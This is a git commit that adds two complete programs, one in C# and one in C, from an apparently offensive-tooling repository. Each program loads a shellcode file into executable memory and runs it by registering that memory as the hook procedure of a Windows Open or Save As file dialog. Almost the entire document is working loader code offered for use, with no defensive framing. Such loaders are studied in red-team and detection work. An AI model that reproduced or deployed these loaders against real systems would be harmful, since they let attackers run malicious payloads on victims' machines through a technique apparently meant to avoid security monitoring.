475a68afad26eb472d49cfa440f4cf0e5ab654a0
Wra7h <60988551+Wra7h@users.noreply.github.com>
2022-09-11 18:57:48 -0700

    Added GetOpenFileName/GetSaveFileName using hooks [Sept 11]

---
+++ C#/GetSaveFileName.cs
@@ -0,0 +1,99 @@
+// Wra7h/FlavorTown
+// Compile with: Visual Studio 2022 & .NET Fx 3.5+
+// Usage: this.exe <shellcode file>
+
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace GetSaveFileName
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length < 1)
+            {
+                Console.WriteLine("\nNo shellcode specified.");
+                Console.WriteLine("Example Usage: GetSaveFileName.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
+                System.Environment.Exit(1);
+            }
+
+            byte[] payload = System.IO.File.ReadAllBytes(args[0]);
+
+            IntPtr hAlloc = VirtualAlloc(
+                            IntPtr.Zero, (uint)payload.Length,
+                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);
+
+            Marshal.Copy(payload, 0, hAlloc, payload.Length);
+
+            uint oldProtect;
+            VirtualProtectEx(Process.GetCurrentProcess().Handle,
+                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);
+
+            /* 
+             * To enable a hook procedure for an Explorer-style Open or Save As dialog box, use the OPENFILENAME
+             * structure when you create the dialog box. Set the OFN_ENABLEHOOK and OFN_EXPLORER flags in the
+             * Flags member and specify the address of an OFNHookProc hook procedure in the lpfnHook member.
+             * See: https://docs.microsoft.com/en-us/windows/win32/dlgbox/open-and-save-as-dialog-boxes#explorer-style-hook-procedures
+             */
+
+            int OFN_ENABLEHOOK = 0x00000020;
+            int OFN_EXPLORER = 0x00080000;
+
+            OpenFileName sOpenFileName = new OpenFileName();
+            sOpenFileName.lStructSize = Marshal.SizeOf(sOpenFileName);
+            sOpenFileName.nMaxFile = 260;
+            sOpenFileName.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
+            sOpenFileName.lpfnHook = hAlloc;
+
+            GetSaveFileName(ref sOpenFileName);
+        }
+
+        [DllImport("kernel32")]
+        static extern IntPtr VirtualAlloc(
+            IntPtr lpAddress,
+            uint dwSize,
+            uint flAllocationType,
+            uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(
+            IntPtr hProcess,
+            IntPtr lpAddress,
+            int dwSize,
+            uint flNewProtect,
+            out uint lpflOldProtect);
+
+        [DllImport("comdlg32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern bool GetSaveFileName(ref OpenFileName ofn);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+        public struct OpenFileName
+        {
+            public int lStructSize;
+            public IntPtr hwndOwner;
+            public IntPtr hInstance;
+            public string lpstrFilter;
+            public string lpstrCustomFilter;
+            public int nMaxCustFilter;
+            public int nFilterIndex;
+            public string lpstrFile;
+            public int nMaxFile;
+            public string lpstrFileTitle;
+            public int nMaxFileTitle;
+            public string lpstrInitialDir;
+            public string lpstrTitle;
+            public int Flags;
+            public short nFileOffset;
+            public short nFileExtension;
+            public string lpstrDefExt;
+            public IntPtr lCustData;
+            public IntPtr lpfnHook;
+            public string lpTemplateName;
+            public IntPtr pvReserved;
+            public int dwReserved;
+            public int flagsEx;
+        }
+    }
+}
---
+++ C/GetOpenFileName.c
@@ -0,0 +1,72 @@
+// Wra7h/FlavorTown
+// Written/Compiled: Visual Studio 2022
+// Usage: this.exe <shellcode file>
+#pragma comment(lib, "Comdlg32.lib")
+
+
+#include <stdio.h>
+#include <windows.h>
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
+
+INT wmain(INT argc, WCHAR* argv[])
+{
+	BOOL Ret = FALSE;
+	DWORD SCLen = 0;
+	PCHAR Shellcode = NULL;
+
+	if (argc != 2)
+	{
+		printf("Usage: GetOpenFileName.exe C:\\Path\\To\\Shellcode.bin");
+		goto CLEANUP;
+	}
+
+	//Read shellcode and setup
+	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
+	if (!Ret)
+		goto CLEANUP;
+
+	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
+		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	memcpy(hAlloc, Shellcode, SCLen);
+
+	/*
+	* To enable a hook procedure for an Explorer-style Open or Save As dialog box, use the OPENFILENAME
+	* structure when you create the dialog box. Set the OFN_ENABLEHOOK and OFN_EXPLORER flags in the
+	* Flags member and specify the address of an OFNHookProc hook procedure in the lpfnHook member.
+	* See: https://docs.microsoft.com/en-us/windows/win32/dlgbox/open-and-save-as-dialog-boxes#explorer-style-hook-procedures
+	*/
+
+	OPENFILENAME sOpenFilename = { 0 };
+	sOpenFilename.lStructSize = sizeof(OPENFILENAME);
+	sOpenFilename.nMaxFile = FILENAME_MAX;
+	sOpenFilename.hwndOwner = NULL;
+	sOpenFilename.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
+	sOpenFilename.lpfnHook = (LPOFNHOOKPROC) hAlloc;
+
+	GetOpenFileName(&sOpenFilename);
+
+CLEANUP:
+	if (Shellcode)
+		free(Shellcode);
+
+	return 0;
+}
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
+{
+	FILE* f = NULL;
+	_wfopen_s(&f, Filepath, L"rb");
+	if (f)
+	{
+		fseek(f, 0, SEEK_END);
+		*BufferSize = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		*Buffer = malloc(*BufferSize);
+		fread(*Buffer, *BufferSize, 1, f);
+		fclose(f);
+	}
+
+	return (*BufferSize != 0) ? TRUE : FALSE;
+}
